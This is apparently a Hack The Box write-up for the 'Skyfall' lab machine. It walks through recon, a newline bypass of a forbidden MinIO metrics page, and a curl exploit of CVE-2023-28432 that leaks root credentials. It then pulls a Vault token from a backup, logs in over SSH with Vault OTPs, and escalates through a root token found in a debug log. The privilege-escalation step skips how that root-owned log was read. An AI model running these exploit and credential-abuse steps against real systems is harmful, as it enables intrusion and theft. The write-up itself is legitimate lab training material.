![image](https://github.com/user-attachments/assets/fe8dfdf4-682a-49ea-a1b1-b5f41a11a245)

## 1. Recon

### 1.1. Port Scan `nmap`

```console
root@kali:~# nmap -Pn -A 10.10.11.254
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-17 21:00 +08
Nmap scan report for 10.10.11.254
Host is up (0.0053s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Skyfall - Introducing Sky Storage!
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=7/17%OT=22%CT=1%CU=30324%PV=Y%DS=2%DC=T%G=Y%TM=6697
OS:C08B%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552
OS:ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT     ADDRESS
1   6.00 ms 10.10.14.1
2   6.09 ms 10.10.11.254

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.09 seconds
```

|Option|Description|
|---|---|
|`-Pn`|Treat all hosts as online -- skip host discovery|
|`-A`|Enable OS detection, version detection, script scanning, and traceroute|

```console
root@kali:~# curl -IL http://10.10.11.254/
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 17 Jul 2024 13:06:09 GMT
Content-Type: text/html
Content-Length: 20631
Last-Modified: Thu, 09 Nov 2023 20:44:23 GMT
Connection: keep-alive
ETag: "654d44a7-5097"
Accept-Ranges: bytes
```

![image](https://github.com/user-attachments/assets/7cef8c1e-adc0-4fde-8de2-1ccc7e7fd4e0)

### 1.2. Directory Brute Force `gobuster`

```console
root@kali:~# gobuster dir -u http://10.10.11.254 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 150 -x txt,html,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.254
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 20631]
/assets               (Status: 301) [Size: 178] [--> http://10.10.11.254/assets/]
[ERROR] ...
⋮
[ERROR] ...
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

|Option|Description|
|---|---|
|`-w, --wordlist string`|Path to the wordlist. Set to - to use STDIN|
|`-t, --threads int`|Number of concurrent threads (default 10)|
|`-x string`|File extension(s) to search for (dir mode only)|

### 1.3. Subdomain Fuzzing `ffuf`

```console
root@kali:~# ffuf -c -ac -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.skyfall.htb' -u http://10.10.11.254

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.254
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.skyfall.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

demo                    [Status: 302, Size: 217, Words: 23, Lines: 1, Duration: 12ms]
:: Progress: [4989/4989] :: Job [1/1] :: 6060 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

|Option|Description|
|---|---|
|`-c`|Colorize output. (default: false)|
|`-ac`|Automatically calibrate filtering options (default: false)|
|`-w`|Wordlist file path and (optional) keyword separated by colon. eg. '/path/to/wordlist:KEYWORD'|
|`-H`|Header `"Name: Value"`, separated by colon. Multiple -H flags are accepted.|
|`-u`|Target URL|

### 1.4. Explore `demo.skyfall.htb`

```console
root@kali:~# sed -i '0,/localhost/a 10.10.11.254    demo.skyfall.htb' /etc/hosts

root@kali:~# curl -ILH 'Host: demo.skyfall.htb' http://10.10.11.254/
HTTP/1.1 302 FOUND
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 17 Jul 2024 13:11:09 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 217
Connection: keep-alive
Location: http://demo.skyfall.htb/login

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 17 Jul 2024 13:11:09 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3674
Connection: keep-alive
Vary: Cookie
Set-Cookie: session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiOWJkMmQ5NGQ4ZDM5NTk5M2FjMDA0NjQ1NTkxOTE2ZTk2YjkwMTEyMyJ9.Zpio8A.bhD3rYYaYe8nxfexfiz8ZwR_N0s; HttpOnly; Path=/
```

![image](https://github.com/user-attachments/assets/c400d9dc-f32e-48bd-855d-0deb7b050620)

Page found to be `MinIO` storage system

![image](https://github.com/user-attachments/assets/230fa03f-21b4-4c8f-a12c-f986c03ea987)

![image](https://github.com/user-attachments/assets/e84a73a0-ce70-4318-9c9a-a33ba827add6)

Metrics page is forbidden:

![image](https://github.com/user-attachments/assets/5cc94b54-b9d3-4761-8f32-cd65ce73d116)

Accessing metrics with `%0A` (new-line):

![image](https://github.com/user-attachments/assets/77e95bd9-a384-45fe-bb38-17d922558a1c)

`MinIO` endpoint found at the end of the metrics page:

![image](https://github.com/user-attachments/assets/51d75a3e-0c74-4a52-9b5f-f4be30e7b008)

## 2. Initial Access

### 2.1. Attempting to find exploits on exploit-db (no avail)

```console
root@kali:~# searchsploit minio
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
Drupal Module MiniorangeSAML 8.x-2.22 - Privilege escalation       | php/webapps/50361.txt
Minio 2022-07-29T19-40-48Z - Path traversal                        | go/webapps/51734.py
MinIO < 2024-01-31T20-20-33Z - Privilege Escalation                | go/remote/51976.txt
------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

#### 2.1.1. Testing `51976` (`CVE-2024-24747`)

```console
root@kali:~# searchsploit -m 51976
  Exploit: MinIO < 2024-01-31T20-20-33Z - Privilege Escalation
      URL: https://www.exploit-db.com/exploits/51976
     Path: /usr/share/exploitdb/exploits/go/remote/51976.txt
    Codes: CVE-2024-24747
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable, with very long lines (545)
Copied to: /root/51976.txt

root@kali:~# mv 51976.txt 51976.py
```

```console
root@kali:~# python 51976.py
Traceback (most recent call last):
  File "/root/51976.py", line 19, in <module>
    from minio.credentials import Credentials
ModuleNotFoundError: No module named 'minio'

root@kali:~# pip install minio
Collecting minio
  Downloading minio-7.2.7-py3-none-any.whl.metadata (6.4 kB)
⋮
Successfully installed argon2-cffi-23.1.0 argon2-cffi-bindings-21.2.0 minio-7.2.7 pycryptodome-3.20.0
```

Turns out `CVE-2024-24747` requires access/secret key pair to work

```console
root@kali:~# python 51976.py

                           ____    ___   ____   _  _           ____   _  _    _____  _  _    _____
  ___ __   __  ___        |___ \  / _ \ |___ \ | || |         |___ \ | || |  |___  || || |  |___  |
 / __|\ \ / / / _ \ _____   __) || | | |  __) || || |_  _____   __) || || |_    / / | || |_    / /
| (__  \ V / |  __/|_____| / __/ | |_| | / __/ |__   _||_____| / __/ |__   _|  / /  |__   _|  / /
 \___|  \_/   \___|       |_____| \___/ |_____|   |_|         |_____|   |_|   /_/      |_|   /_/

usage: 51976.py [-h] -H HOST -a ACCESSKEY -s SECRETKEY -c CONSOLE_PORT -p PORT [--https]
51976.py: error: the following arguments are required: -H/--host, -a/--accesskey, -s/--secretkey, -c/--console_port, -p/--port
```

#### 2.1.2. Testing `51734` (`CVE-2022-35919`)

```console
root@kali:~# searchsploit -m 51734
  Exploit: Minio 2022-07-29T19-40-48Z - Path traversal
      URL: https://www.exploit-db.com/exploits/51734
     Path: /usr/share/exploitdb/exploits/go/webapps/51734.py
    Codes: CVE-2022-35919
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /root/51734.py

root@kali:~# python 51734.py
usage: 51734.py [-h] -u URL -a ACCESSKEY -s SECRETKEY
51734.py: error: the following arguments are required: -u/--url, -a/--accesskey, -s/--secretkey
```

### 2.2. Searching for exploits online

Googling for `minio exploits` return some interesting results

- https://www.cvedetails.com/vulnerability-list/vendor_id-18671/Minio.html lists the `CVE-2024-24747` and `CVE-2022-35919` vulnerabilities found in exploit-db
- It also lists 2 more `known exploited` vulnerabilities `CVE-2023-28434` and `CVE-2023-28432`
- Between the 2, `CVE-2023-28432` looks promising with `public exploit` available

![image](https://github.com/user-attachments/assets/6618aaf3-e5d1-4e14-b27a-81b121c9554a)

Googling for `CVE-2023-28432` returns [this POC](https://github.com/acheiii/CVE-2023-28432)

The exploit seems simple enough: perform a `POST` request to the Minio Endpoint at path `/minio/bootstrap/v1/verify`

Recall that the Minio Endpoint was discovered at the metrics page to be: `http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster`

```console
root@kali:~# sed -i '0,/localhost/a 10.10.11.254    prd23-s3-backend.skyfall.htb' /etc/hosts

root@kali:~# curl -v -X POST http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify
* Host prd23-s3-backend.skyfall.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.254
*   Trying 10.10.11.254:80...
* Connected to prd23-s3-backend.skyfall.htb (10.10.11.254) port 80
> POST /minio/bootstrap/v1/verify HTTP/1.1
> Host: prd23-s3-backend.skyfall.htb
> User-Agent: curl/8.7.1
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Thu, 18 Jul 2024 06:25:40 GMT
< Content-Type: text/plain; charset=utf-8
< Content-Length: 1444
< Connection: keep-alive
< Content-Security-Policy: block-all-mixed-content
< Strict-Transport-Security: max-age=31536000; includeSubDomains
< Vary: Origin
< X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
< X-Amz-Request-Id: 17E33A9FAFD20213
< X-Content-Type-Options: nosniff
< X-Xss-Protection: 1; mode=block
<
{"MinioEndpoints":[{"Legacy":false,"SetCount":1,"DrivesPerSet":4,"Endpoints":[{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node1:9000","Path":"/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node2:9000","Path":"/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node1:9000","Path":"/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node2:9000","Path":"/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true}],"CmdLine":"http://minio-node{1...2}/data{1...2}","Platform":"OS: linux | Arch: amd64"}],"MinioEnv":{"MINIO_ACCESS_KEY_FILE":"access_key","MINIO_BROWSER":"off","MINIO_CONFIG_ENV_FILE":"config.env","MINIO_KMS_SECRET_KEY_FILE":"kms_master_key","MINIO_PROMETHEUS_AUTH_TYPE":"public","MINIO_ROOT_PASSWORD":"GkpjkmiVmpFuL2d3oRx0","MINIO_ROOT_PASSWORD_FILE":"secret_key","MINIO_ROOT_USER":"5GrE1B2YGGyZzNHZaIww","MINIO_ROOT_USER_FILE":"access_key","MINIO_SECRET_KEY_FILE":"secret_key","MINIO_UPDATE":"off","MINIO_UPDATE_MINISIGN_PUBKEY":"RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"}}
* Connection #0 to host prd23-s3-backend.skyfall.htb left intact
```

The `MINIO_ROOT_USER` and `MINIO_ROOT_PASSWORD` found under `MinioEnv`:

```json
{
  "MinioEnv": {
    "MINIO_ACCESS_KEY_FILE": "access_key",
    "MINIO_BROWSER": "off",
    "MINIO_CONFIG_ENV_FILE": "config.env",
    "MINIO_KMS_SECRET_KEY_FILE": "kms_master_key",
    "MINIO_PROMETHEUS_AUTH_TYPE": "public",
    "MINIO_ROOT_PASSWORD": "GkpjkmiVmpFuL2d3oRx0",
    "MINIO_ROOT_PASSWORD_FILE": "secret_key",
    "MINIO_ROOT_USER": "5GrE1B2YGGyZzNHZaIww",
    "MINIO_ROOT_USER_FILE": "access_key",
    "MINIO_SECRET_KEY_FILE": "secret_key",
    "MINIO_UPDATE": "off",
    "MINIO_UPDATE_MINISIGN_PUBKEY": "RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"
  }
}
```

### 2.3. Looking around with MinIO credentials

Googling for MinIO usage leads to the client software `mc`: https://min.io/docs/minio/linux/reference/minio-mc.html

```console
root@kali:~# curl https://dl.min.io/client/mc/release/linux-amd64/mc --create-dirs -o $HOME/minio-binaries/mc
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 25.6M  100 25.6M    0     0  7497k      0  0:00:03  0:00:03 --:--:-- 7497k

root@kali:~# chmod +x $HOME/minio-binaries/mc

root@kali:~# export PATH=$PATH:$HOME/minio-binaries/

root@kali:~# mc alias set skyfall http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0
mc: Configuration written to `/root/.mc/config.json`. Please update your access credentials.
mc: Successfully created `/root/.mc/share`.
mc: Initialized share uploads `/root/.mc/share/uploads.json` file.
mc: Initialized share downloads `/root/.mc/share/downloads.json` file.
Added `skyfall` successfully.

root@kali:~# mc ls -r --versions skyfall
[2023-11-08 12:59:15 +08]     0B askyy/
[2023-11-08 13:35:28 +08]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT askyy/Welcome.pdf
[2023-11-10 05:37:25 +08] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT askyy/home_backup.tar.gz
[2023-11-10 05:37:09 +08] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT askyy/home_backup.tar.gz
[2023-11-10 05:36:30 +08] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT askyy/home_backup.tar.gz
[2023-11-08 12:58:56 +08]     0B btanner/
[2023-11-08 13:35:36 +08]  48KiB STANDARD null v1 PUT btanner/Welcome.pdf
[2023-11-08 12:58:33 +08]     0B emoneypenny/
[2023-11-08 13:35:56 +08]  48KiB STANDARD null v1 PUT emoneypenny/Welcome.pdf
[2023-11-08 12:58:22 +08]     0B gmallory/
[2023-11-08 13:36:02 +08]  48KiB STANDARD null v1 PUT gmallory/Welcome.pdf
[2023-11-08 08:08:01 +08]     0B guest/
[2023-11-08 08:08:05 +08]  48KiB STANDARD null v1 PUT guest/Welcome.pdf
[2023-11-08 12:59:05 +08]     0B jbond/
[2023-11-08 13:35:45 +08]  48KiB STANDARD null v1 PUT jbond/Welcome.pdf
[2023-11-08 12:58:10 +08]     0B omansfield/
[2023-11-08 13:36:09 +08]  48KiB STANDARD null v1 PUT omansfield/Welcome.pdf
[2023-11-08 12:58:45 +08]     0B rsilva/
[2023-11-08 13:35:51 +08]  48KiB STANDARD null v1 PUT rsilva/Welcome.pdf
```

```console
root@kali:~# mc cp --version-id 2b75346d-2a47-4203-ab09-3c9f878466b8 skyfall/askyy/home_backup.tar.gz .
...fall.htb/askyy/home_backup.tar.gz: 2.64 KiB / 2.64 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 54.48 KiB/s 0s

root@kali:~# mkdir askyy_home_backup

root@kali:~# tar xvf home_backup.tar.gz -C ./askyy_home_backup
./
./.profile
./.bashrc
./.ssh/
./.ssh/authorized_keys
./.sudo_as_admin_successful
./.bash_history
./.bash_logout
./.cache/
./.cache/motd.legal-displayed
```

`VAULT_API_ADDR` and `VAULT_TOKEN` found in `.bashrc` (v2):

```console
root@kali:~# cat ./askyy_home_backup/.bashrc
⋮
export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
⋮
```

### 2.4. Access Vault

Get the [Vault Client](https://developer.hashicorp.com/vault/downloads#linux) and access the Vault with the `VAULT_TOKEN`

```console
root@kali:~# sed -i '0,/localhost/a 10.10.11.254    prd23-vault-internal.skyfall.htb' /etc/hosts

root@kali:~# curl -sLO https://releases.hashicorp.com/vault/1.17.2/vault_1.17.2_linux_amd64.zip

root@kali:~# unzip vault_1.17.2_linux_amd64.zip
Archive:  vault_1.17.2_linux_amd64.zip
  inflating: vault
  inflating: LICENSE.txt

root@kali:~# mv vault /usr/local/bin/

root@kali:~# export VAULT_ADDR=http://prd23-vault-internal.skyfall.htb

root@kali:~# vault login
Token (will be hidden):
WARNING! The VAULT_TOKEN environment variable is set! The value of this
variable will take precedence; if this is unwanted please unset VAULT_TOKEN or
update its value accordingly.

Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE
token_accessor       rByv1coOBC9ITZpzqbDtTUm8
token_duration       431958h30m18s
token_renewable      true
token_policies       ["default" "developers"]
identity_policies    []
policies             ["default" "developers"]
```

Guessing SSH access - typicaly SSH credentials are placed on `ssh/roles` path in Vault, let's try querying:

```console
root@kali:~# vault token capabilities ssh/roles
list

root@kali:~# vault list ssh/roles
Keys
----
admin_otp_key_role
dev_otp_key_role
```

2 methods found for logging in:

1. Generating SSH OTP then logging in:

```console
root@kali:~# vault write ssh/creds/dev_otp_key_role ip=10.10.11.254 username=askyy
Key                Value
---                -----
lease_id           ssh/creds/dev_otp_key_role/ohYg5PjGRJeL5mC3ZLZTJCwj
lease_duration     768h
lease_renewable    false
ip                 10.10.11.254
key                32532fe5-132c-a69a-da61-3d51bdb00301
key_type           otp
port               22
username           askyy
root@kali:~# ssh askyy@10.10.11.254
Warning: Permanently added '10.10.11.254' (ED25519) to the list of known hosts.
(askyy@10.10.11.254) Password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jul 18 14:29:20 2024 from 10.10.14.76
askyy@skyfall:~$ id
uid=1000(askyy) gid=1000(askyy) groups=1000(askyy)
```

2. Use Vault to automatically log in:

> [!Note]
>
> `sshpass` needs to be installed on Kali.
>
> Otherwise, Vault will warn about `sshpass` and just display the OTP to be entered manually

```console
root@kali:~# vault ssh -role dev_otp_key_role -mode OTP -strict-host-key-checking=no askyy@10.10.11.254
Warning: Permanently added '10.10.11.254' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jul 18 14:39:55 2024 from 10.10.14.76
askyy@skyfall:~$ ls -lR
.:
total 4
-rw-r----- 1 root askyy 33 Jul 17 19:53 user.txt
askyy@skyfall:~$ cat user.txt
a401eefac043d0f7f9ac55a8a786621f
```

## 3. Privilege Escalation

Listing `sudo` rights reveal user `askyy` can execute `/root/vault/vault-unseal`

```console
askyy@skyfall:~$ sudo -l
Matching Defaults entries for askyy on skyfall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User askyy may run the following commands on skyfall:
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h
Usage:
  vault-unseal [OPTIONS]

Application Options:
  -v, --verbose        enable verbose output
  -d, --debug          enable debugging output to file (extra logging)
  -c, --config=PATH    path to configuration file

Help Options:
  -h, --help           Show this help message

askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false
```

The debug option `-d` writes a `debug.log` file, but the file is written with `600` permissions and `root:root` ownership

```
askyy@skyfall:~$ ls -l
total 8
-rw------- 1 root root  590 Jul 18 14:57 debug.log
-rw-r----- 1 root askyy  33 Jul 17 19:53 user.txt
```

By right the `debug.log` should have a master token:

```console
root@skyfall:~# cat /home/askyy/debug.log
2024/07/18 15:27:35 Initializing logger...
2024/07/18 15:27:35 Reading: /etc/vault-unseal.yaml
2024/07/18 15:27:35 Security Risk!
2024/07/18 15:27:35 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
2024/07/18 15:27:35 Found Vault node: http://prd23-vault-internal.skyfall.htb
2024/07/18 15:27:35 Check interval: 5s
2024/07/18 15:27:35 Max checks: 5
2024/07/18 15:27:35 Establishing connection to Vault...
2024/07/18 15:27:35 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
2024/07/18 15:27:35 Checking seal status
2024/07/18 15:27:35 Vault sealed: false
```

```console
root@kali:~# vault login
Token (will be hidden):
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                hvs.I0ewVsmaKU1SwVZAKR3T0mmG
token_accessor       bXBeXR3r92WGQ8XgEDx6pIFu
token_duration       ∞
token_renewable      false
token_policies       ["root"]
identity_policies    []
policies             ["root"]
root@kali:~# vault ssh -role admin_otp_key_role -mode otp -strict-host-key-checking=no root@10.10.11.254
Warning: Permanently added '10.10.11.254' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Mar 27 13:20:05 2024 from 10.10.14.46
root@skyfall:~# ls -l
total 16
drwxr-x--- 6 root root 4096 Jan 18 10:44 minio
-rw-r----- 1 root root   33 Jul 18 15:22 root.txt
drwxr-x--- 6 root root 4096 Feb  5 14:56 sky_storage
drwxr-x--- 3 root root 4096 Jan 10  2024 vault
root@skyfall:~# cat root.txt
d265b13160ec8f394ebd9b5848f11b6f
```
